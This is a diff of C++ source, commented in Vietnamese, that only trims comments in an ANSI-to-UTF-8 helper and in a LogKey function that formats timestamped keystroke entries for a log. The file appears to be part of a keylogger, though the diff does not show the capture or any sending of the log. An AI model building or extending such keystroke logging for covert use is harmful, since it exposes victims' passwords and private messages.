@@ -6,23 +6,21 @@
 
 std::string AnsiToUtf8(const std::string& ansi_str)
 {
-    // 1. Tính toán kích thước buffer cho Wide String (UTF-16)
+    // Tính toán kích thước buffer cho Wide String (UTF-16)
     int wide_size = MultiByteToWideChar(CP_ACP, 0, ansi_str.c_str(), -1, nullptr, 0);
     if (wide_size == 0) return "";
     std::wstring wstr(wide_size, 0);
 
-    // 2. Chuyển đổi ANSI sang Wide String
     MultiByteToWideChar(CP_ACP, 0, ansi_str.c_str(), -1, &wstr[0], wide_size);
 
-    // 3. Tính toán kích thước buffer cho UTF-8
+    // Tính toán kích thước buffer cho UTF-8
     int utf8_size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
     if (utf8_size == 0) return "";
     std::string utf8_str(utf8_size, 0);
 
-    // 4. Chuyển đổi Wide String sang UTF-8
     WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &utf8_str[0], utf8_size, nullptr, nullptr);
 
-    // Loại bỏ ký tự null cuối chuỗi (vì -1 được truyền cho độ dài)
+    // Loại bỏ ký tự null cuối chuỗi
     if (!utf8_str.empty() && utf8_str.back() == 0) {
         utf8_str.pop_back();
     }
@@ -34,11 +32,11 @@ std::string LogKey(int key_stroke)
     std::string log_entry;
     std::stringstream ss;
 
-    // --- BƯỚC MỚI: Lấy và định dạng thời gian ---
+    // --- Lấy và định dạng thời gian ---
     time_t now = time(0);
     struct tm *ltm = localtime(&now);
 
-    // Định dạng thời gian: [YYYY-MM-DD HH:MM:SS]
+    // [YYYY-MM-DD HH:MM:SS]
     ss << "[" << 1900 + ltm->tm_year << "-" 
        << 1 + ltm->tm_mon << "-" 
        << ltm->tm_mday << " "
@@ -106,10 +104,9 @@ std::string LogKey(int key_stroke)
             break;
     }
     
-    // Thêm nội dung vào chuỗi log toàn cục
+    // Thêm nội dung vào chuỗi log
     log_entry += ss.str();
     
-    // Thêm ký tự xuống dòng sau mỗi keypress
     log_entry += "\n";
     return log_entry;
 }
